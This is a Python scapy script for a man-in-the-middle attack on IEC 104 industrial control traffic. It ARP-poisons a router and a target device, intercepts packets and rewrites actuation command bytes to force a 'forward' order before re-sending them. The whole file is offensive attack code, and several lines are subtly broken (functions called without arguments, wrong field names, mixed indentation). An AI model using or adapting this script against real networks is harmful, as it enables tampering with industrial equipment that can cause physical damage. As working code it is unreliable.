#!/usr/bin/python3

"""
    Use scapy to modify packets going through your machine.
    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
"""
from iec104lib import *
from EchoIEC104Server import *

ip_router = ARP_poisoning.get_iprouter()
ip_target= ARP_poisoning.get_ipdest()
ip_attack = ARP_poisoning.get_ipsrc()
mac_router=ARP_poisoning.get_mac(ip_router)
mac_target=ARP_poisoning.get_mac(ip_target)

interface = "eno1"

## Def vars for our needed paquets

LENGTH_APCI=6
ASDU_TYPE_BYTE=1
ASDU_ACT_ORDER_VALUE_BYTE=9 
ASDU_ACT_ORDER_VALUE_LENGTH=2 

ASDU_TYPE_ACT_CHAR="\x31"
ASDU_ACT_ORDER_STOP_VALUE_STR="\x00\x00"
ASDU_ACT_ORDER_BACKWARDS_VALUE_STR="\x07\x00"
ASDU_ACT_ORDER_FORWARD_VALUE_STR="\xe7\x00"

def modify_packet_for_target(chosen_packet) :
	chosen_packet[Ether].src = chosen_packet[Ether].dest
	chosen_packet[Ether].dest = mac_target

	#delete the checksum so that scapy will handle them and recalculate them
	del chosen_packet[IP].chksum
	del chosen_packet[TCP].chksum

def modify_packet_for_router(chosen_packet) :
	chosen_packet[Ether].src = chosen_packet[Ether].dest
	chosen_packet[Ether].dest = mac_router

	#delete the checksum so that scapy will handle them and recalculate them
	del chosen_packet[IP].chksum
	del chosen_packet[TCP].chksum

def modify_mesure_packet(chosen_packet):
	#get a list of bytes from the payload
	copied_packet_payload_list=list(str(chosen_packet[TCP].payload))
	print("\t before : "+"".join(copied_packet_payload_list).encode("hex"))
	#modify the 2bytes to the FORWARD value
	copied_packet_payload_list[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]=ASDU_ACT_ORDER_FORWARD_VALUE_STR
	new_payload="".join(copied_packet_payload_list)
	#put the changed payload in the original packet
	chosen_packet[TCP].payload=Raw(new_payload)
	print("\t after  : "+new_payload.encode("hex"))

	#print(chosen_packet.show2())


def is_packet_containing_apci(packet):
	if packet.haslayer(u_frame) or packet.haslayer(s_frame) or packet.haslayer(i_frame) :
		return True
	else :
		return False

def is_104_packet_from_router(packet):
	if is_packet_containing_apci()  and (packet[IP].src==ip_router):
		return True
	else:
		return False

def is_104_packet_from_raspberry(packet):
	if is_packet_containing_apci() and (packet[IP].src ==ip_target):
		return True
	else:
		return False


def is_packet_mesure_packet(packet):
	if( is_packet_containing_apci(packet) and is_104_packet_from_raspberry(packet) and packet.haslayer(asdu_infobj_13)) :
		return True
	else :
		return False


def mitm(chosen_packet):

	if(chosen_packet[Ether].src == mac_router and chosen_packet[IP].src==ip_router and chosen_packet[IP].dst==ip_target):
		modify_packet_for_target(chosen_packet)
		if is_packet_mesure_packet():
			modify_mesure_packet(chosen_packet)

		send(chosen_packet, verbose=False)

	if(chosen_packet[Ether].src == mac_target and chosen_packet[IP].src==ip_target and chosen_packet[IP].dst==ip_router):
		modify_packet_for_router(chosen_packet)
		send(chosen_packet, verbose=False)

def loop_sleep():
	while 1:
		try:
			time.sleep(1.5)
		except KeyboardInterrupt:
			break

def main_sniff():

	print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
	sniff(prn=mitm, filter="ip")

	start_ip_forward()
	print("MitM with full forward until ctrl-c")
	loop_sleep()
	print("")
	stop_ip_forward()

if __name__ == "__main__":
	ARP_poisoning.poisoning()
	EchoIEC104Server.server()
    main_sniff()

